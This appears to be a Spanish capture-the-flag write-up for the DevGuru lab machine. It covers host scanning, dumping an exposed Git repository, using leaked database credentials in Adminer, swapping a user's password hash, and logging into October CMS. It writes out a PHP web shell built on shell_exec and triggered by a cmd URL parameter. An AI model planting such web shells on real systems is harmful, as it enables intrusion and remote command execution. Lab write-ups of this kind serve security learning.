# EMPEZAMOS LA MAQUINA

Empezamos con la fase de reconocimiento 

Para ello vamos a realizar un escaneo de todas las ips en mi red.

![image](https://github.com/user-attachments/assets/3eac18c0-4b92-4428-a7df-c09de24c1947)

![image](https://github.com/user-attachments/assets/1ce02cf9-f645-4310-b47f-28fd7f3da351)

Encontraríamos la ip victima que la tengo abierta en mi maquina virtual y tiene una ip asignada que es la 10.0.2.7 asignada por la red NAT
Veriamos que tenemos los puertos abiertos 22(ssh) y 80(http) por ahora.

Vamos a realizar un escaneo de la ip victima mas profundo.

![image](https://github.com/user-attachments/assets/f938fbaa-bd0e-46fe-8b35-dc7704d859c9)

Vemos un enlace que nos da una url

![image](https://github.com/user-attachments/assets/bccf8383-9e24-413d-a332-4a0ab3c3d3fb)

devguru.local

Vamos a irnos a los hosts y vamos a poner el dominio con la ip ya que no lo entiende nuestra maquina

![image](https://github.com/user-attachments/assets/4f25377e-a911-4483-a2e0-ce6f30522076)

Colocamos la ip con el dominio

![image](https://github.com/user-attachments/assets/db1cb272-f0b5-46c8-b362-ba738f5583e5)

Vamos a clonarnos GitTools para probar si hay directorios en la URL.

```bash
https://github.com/internetwache/GitTools
```

Una vez hecho esto vamos a ejecutar el gitdumper de la carpeta "Dumper"

![image](https://github.com/user-attachments/assets/36d2a396-ffda-4386-96b3-6597dbda7611)

Vamos a descargar los archivos del dumper con "Extractor"

![image](https://github.com/user-attachments/assets/afdead03-e7da-4d83-9e3a-96adcb343735)

De esta manera todo lo que ha emcontrado el DUMPER lo podremos interpretar con el EXTRACTOR en un archivo que lo podemos abrir.

Vamos a entrar en el archivo website y vamos a listar el archivo que se nos ha generado

![image](https://github.com/user-attachments/assets/45f458fa-907a-4f75-b44a-31c8f4c8e8a8)

Tenemos todos estos archivos pero el que mas me interesa es adminer.php

Viendo todo esto, vemos que esta montado en codigo php

Vamos a probar a entrar al directorio de adminer.php desde la web

![image](https://github.com/user-attachments/assets/33f6fad8-6993-4183-acad-9540b68f5bd9)

Vemos que hay un panel de inicio de sesion

Vamos a ver el codigo fuente en busca de informacion

![image](https://github.com/user-attachments/assets/2734cf0e-681e-4471-b43d-9bf4eaadc455)

Podriamos inyectar un script pero no lo voy a hacer en esta ocasión

Vamos a entrar al archivo config de el archivo del EXTRACTOR 

![image](https://github.com/user-attachments/assets/ce8ce83c-f404-417c-b8a5-9b8d9308945e)

Vemos que tenemos un archivo llamado database.php

Vamos a hacer un nano

![image](https://github.com/user-attachments/assets/6808d241-5738-4d97-997f-872fd6838173)

Como vemos tenemos toda esta informacion para poder acceder a la base de datos de MySQL, que en este caso, es la que necesitamos para entrar como vimos anteriormente.

![image](https://github.com/user-attachments/assets/36d1c33d-0b98-4609-8eb3-ff9e0f914cb1)

Vamos a probar a entrar, en este caso, entramos y veremos una base de datos de adminer

Vamos a revisar la base de datos

![image](https://github.com/user-attachments/assets/ecbcfb54-2758-46e9-8fa9-0554243b073a)

Investigo y me doy cuenta de que hay credenciales de un usuario

La contraseña esta encriptada, para ello vamos a cambiarla por otra contraseña encriptada desde la siguiente pagina web

![image](https://github.com/user-attachments/assets/adc7e42b-b5bc-4c28-b389-136df6ff9508)

Vamos a entrar al backend a ver si hay algun panel de inicio de sesion para entrar con nuestro usuario Frank y la contraseña que hemos cambiado

![image](https://github.com/user-attachments/assets/52708407-c2f2-4c67-96cf-43dd16b17ceb)

Me doy cuenta de que la he puesto pero era la encriptada, entonces pongo la contraseña "contact"

![image](https://github.com/user-attachments/assets/19fd30c9-d339-4ad9-8882-ad2da502f74b)

Tenemos un exitoso acceso a la pagina de october

![image](https://github.com/user-attachments/assets/f0373d8e-e699-4e91-82f1-e84242d82510)

Vemos que tenemos acceso a un CMS y podemos poner codigo 

![image](https://github.com/user-attachments/assets/61e6efac-52f1-4536-a3f4-f2edc19676a1)

Procedemos a inyectar codigo malicioso php
```bash
function onStart() {
    $this->page['myVar'] = shell_exec($_GET['cmd']);
}
```

![image](https://github.com/user-attachments/assets/1b1adff2-b830-4837-838c-f47a51e75a15)

Vamos a decirle que cuando se ejecute la URL nos lo represente en la pagina

```bash
{{this.page.myVar}}
```

![image](https://github.com/user-attachments/assets/e3e5f826-0a9f-4485-a1cb-08035021176c)



Vamos a guardar en "Save".

Entramos a la pagina web, para ello en la direccion hemos puesto:

´´´bash
http://devguru.local/?cmd= ls -la
´´´

![image](https://github.com/user-attachments/assets/6b8db9e4-054d-4497-a59d-5f39b8f13b20)






